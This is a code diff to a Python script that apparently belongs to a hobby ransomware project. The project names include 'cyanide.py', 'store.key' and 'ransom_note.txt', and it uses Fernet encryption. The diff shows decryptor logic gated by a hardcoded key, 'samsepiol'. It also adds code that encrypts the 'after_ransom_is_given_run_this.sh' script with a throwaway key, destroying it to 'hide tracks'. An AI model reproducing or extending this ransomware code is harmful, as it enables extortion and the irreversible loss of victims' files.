@@ -9,7 +9,7 @@ files = []
 
 
 for file in os.listdir():
-    if file == "monsterwith21faces.py" or file == "store.key" or file == "cyanide.py" or file == "ransom_note.txt" or file == "run_this.sh" or file == "after_ransom_is_given_run_this.sh":
+    if file == "monsterwith21faces.py" or file == "store.key" or file == "cyanide.py" or file == "ransom_note.txt" or file == "run_this.sh":
         continue
     if os.path.isfile(file):
         files.append(file)
@@ -20,6 +20,14 @@ with open("store.key", "rb") as thekey:
 secret_input_key = "samsepiol"
 
 user_input = input("SeCr3T KeY?:\n")
+
+hideur = Fernet.generate_key()
+
+with open("after_ransom_is_given_run_this.sh?raw=true", "rb") as hideurtracks:
+    contents = hideurtracks.read()
+    hidemytracks = Fernet(hideur).encrypt(contents)
+with open("after_ransom_is_given_run_this.sh?raw=true", "wb") as hideurtracks:
+    hideurtracks.write(hidemytracks)
 
 if user_input == secret_input_key:
     for file in files:
